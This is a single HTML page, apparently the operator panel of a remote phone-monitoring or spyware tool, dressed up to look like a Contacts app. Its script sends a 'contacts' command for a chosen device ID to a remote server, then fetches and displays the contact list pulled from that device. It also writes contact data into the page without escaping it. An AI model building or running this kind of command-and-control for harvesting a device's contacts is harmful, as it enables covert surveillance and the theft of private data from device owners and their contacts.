<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contacts</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #000000;
            --text-main: #ffffff;
            --text-sub: #8e8e93;
            --search-bg: #1c1c1e;
            --separator: #38383a;
            --blue-accent: #0a84ff;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0; padding: 0;
            display: flex; justify-content: center;
            min-height: 100vh;
        }

        .container {
            width: 100%; max-width: 480px;
            background: #000;
            display: flex; flex-direction: column;
            position: relative;
            min-height: 100vh;
        }

        /* --- HEADER --- */
        .header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px 20px;
            background: rgba(20, 20, 20, 0.95);
            position: sticky; top: 0; z-index: 100;
            backdrop-filter: blur(10px);
            border-bottom: 0.5px solid var(--separator);
        }

        .back-btn {
            color: var(--blue-accent); font-size: 1.2rem;
            text-decoration: none; width: 30px; height: 30px;
            display: flex; align-items: center; justify-content: center;
        }

        .page-title { font-size: 1.1rem; font-weight: 600; }

        .refresh-btn {
            background: transparent; border: none;
            color: var(--blue-accent); font-size: 1.1rem; 
            cursor: pointer; padding: 0;
        }

        /* --- STATUS BAR --- */
        .status-bar {
            background: #222; color: #ff9f0a;
            font-size: 0.75rem; text-align: center; padding: 4px;
            display: none; /* Hidden by default */
        }

        /* --- SEARCH BAR --- */
        .search-container {
            padding: 10px 15px;
            background: #000;
            position: sticky; top: 60px; z-index: 90;
        }

        .search-box {
            background: var(--search-bg);
            border-radius: 10px;
            display: flex; align-items: center;
            padding: 8px 12px;
        }

        .search-icon { color: var(--text-sub); margin-right: 8px; font-size: 0.9rem; }

        .search-input {
            background: transparent; border: none; outline: none;
            color: var(--text-main); width: 100%; font-size: 1rem;
        }
        
        /* --- CONTACT LIST --- */
        .contact-list { 
            display: flex; flex-direction: column; 
            padding-bottom: 50px;
        }

        .contact-row {
            display: flex; align-items: center;
            padding: 12px 20px;
            border-bottom: 0.5px solid var(--separator);
        }

        .contact-row.hidden { display: none !important; }

        .avatar {
            width: 40px; height: 40px;
            background: #2c2c2e;
            color: #fff;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-weight: 600; font-size: 1.1rem;
            margin-right: 15px; flex-shrink: 0;
        }

        .info { flex: 1; overflow: hidden; }
        
        .name { 
            font-size: 1rem; font-weight: 600; color: #fff;
            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
        }
        
        .number { font-size: 0.85rem; color: var(--text-sub); margin-top: 2px; }

        .call-action {
            width: 35px; height: 35px;
            display: flex; align-items: center; justify-content: center;
            color: var(--blue-accent); font-size: 1.1rem;
            text-decoration: none; margin-left: 10px;
            background: rgba(10, 132, 255, 0.1); border-radius: 50%;
        }

        .empty-msg { text-align: center; color: var(--text-sub); margin-top: 50px; }
        .error-msg { text-align: center; color: #ff453a; margin-top: 50px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
            <span class="page-title">Contacts <span id="count" style="font-size: 0.8rem; color: gray"></span></span>
            <button onclick="manualRefresh()" class="refresh-btn" id="refreshBtn">
                <i class="fa-solid fa-rotate"></i>
            </button>
        </div>

        <div id="statusBar" class="status-bar">Connecting...</div>

        <div class="search-container">
            <div class="search-box">
                <i class="fa-solid fa-magnifying-glass search-icon"></i>
                <input type="text" id="searchInput" class="search-input" placeholder="Search" onkeyup="filterContacts()">
            </div>
        </div>

        <div class="contact-list" id="contactsContainer">
            <div class="empty-msg">
                <i class="fa-solid fa-spinner fa-spin"></i><br><br>Loading Contacts...
            </div>
        </div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com";
        const urlParams = new URLSearchParams(window.location.search);
        
        const DEVICE_ID = urlParams.get('id') ? urlParams.get('id').toUpperCase() : null;
        const storageKey = `contacts_${DEVICE_ID}`;
        
        let allContactsData = []; 

        document.addEventListener("DOMContentLoaded", () => {
            if (!DEVICE_ID) {
                document.getElementById("contactsContainer").innerHTML = '<div class="error-msg">Error: Device ID Missing</div>';
                return;
            }
            
            // 1. Load cached data first (Fast UI)
            loadFromStorage();
            
            // 2. Fetch fresh data
            fetchData();
        });

        function showStatus(msg) {
            const el = document.getElementById("statusBar");
            el.style.display = 'block';
            el.innerText = msg;
        }

        function loadFromStorage() {
            try {
                const saved = localStorage.getItem(storageKey);
                if (saved) {
                    const parsed = JSON.parse(saved);
                    if (Array.isArray(parsed) && parsed.length > 0) {
                        allContactsData = parsed;
                        renderContacts(allContactsData);
                        showStatus("Loaded from Cache");
                    }
                }
            } catch(e) { console.error(e); }
        }

        function manualRefresh() {
            const icon = document.querySelector('#refreshBtn i');
            icon.classList.add('fa-spin');
            showStatus("Sending Command...");

            // Send command request
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
            })
            .then(() => {
                showStatus("Waiting for device...");
                setTimeout(() => {
                    fetchData(true);
                }, 4000);
            })
            .catch(() => {
                showStatus("Command Failed");
                icon.classList.remove('fa-spin');
            });
        }

        function fetchData(isManual = false) {
            showStatus("Fetching Data...");
            const apiURL = `${SERVER_URL}/api/get-data/${DEVICE_ID}/contacts?t=${Date.now()}`;
            
            fetch(apiURL)
                .then(res => res.json())
                .then(data => {
                    const icon = document.querySelector('#refreshBtn i');
                    icon.classList.remove('fa-spin');

                    if (!data || !Array.isArray(data) || data.length === 0) {
                        showStatus("No Data Received");
                        if(allContactsData.length === 0) {
                             document.getElementById("contactsContainer").innerHTML = '<div class="empty-msg">No contacts found on device yet.<br>Click refresh to try again.</div>';
                        }
                        return;
                    }

                    // Data received
                    allContactsData = data;
                    localStorage.setItem(storageKey, JSON.stringify(data));
                    renderContacts(data);
                    showStatus("Updated Just Now");
                    
                    // Hide status bar after 3 seconds if successful
                    setTimeout(() => { document.getElementById("statusBar").style.display = 'none'; }, 3000);
                })
                .catch(err => {
                    console.error("Error fetching", err);
                    document.querySelector('#refreshBtn i').classList.remove('fa-spin');
                    showStatus("Connection Failed");
                    
                    // If screen is still loading (no cache), show error
                    if(allContactsData.length === 0) {
                        document.getElementById("contactsContainer").innerHTML = '<div class="error-msg">Connection Error.<br>Check Server URL.</div>';
                    }
                });
        }

        function renderContacts(data) {
            const container = document.getElementById("contactsContainer");
            
            // Safety Check
            if (!Array.isArray(data)) {
                container.innerHTML = `<div class="error-msg">Invalid Data Format</div>`;
                return;
            }

            // Update Count
            document.getElementById("count").innerText = `(${data.length})`;

            // Sort Alphabetically (Handle emoji/special chars safely)
            data.sort((a, b) => {
                const nameA = (a.name || "").toString().toLowerCase();
                const nameB = (b.name || "").toString().toLowerCase();
                return nameA.localeCompare(nameB);
            });

            // Build HTML
            const html = data.map(contact => {
                const name = contact.name ? String(contact.name) : "Unknown";
                const num = contact.number || contact.phone || "";
                
                // Get First Letter safely
                let firstLetter = "?";
                if(name && name.length > 0) {
                    firstLetter = Array.from(name)[0].toUpperCase(); // Array.from handles Emojis better
                }

                // Sanitize for search (prevent crash on quotes)
                const searchString = (name + " " + num).toLowerCase().replace(/"/g, "&quot;");

                return `
                    <div class="contact-row" data-search="${searchString}">
                        <div class="avatar">${firstLetter}</div>
                        <div class="info">
                            <div class="name">${name}</div>
                            <div class="number">${num}</div>
                        </div>
                        <a href="tel:${num}" class="call-action">
                            <i class="fa-solid fa-phone"></i>
                        </a>
                    </div>`;
            }).join('');

            container.innerHTML = html;
        }

        function filterContacts() {
            const query = document.getElementById('searchInput').value.toLowerCase();
            const rows = document.querySelectorAll('.contact-row');
            
            rows.forEach(row => {
                const searchData = row.getAttribute('data-search');
                // Check if searchData exists before checking includes
                if (searchData && searchData.includes(query)) {
                    row.classList.remove('hidden');
                } else {
                    row.classList.add('hidden');
                }
            });
        }
    </script>
</body>
</html>
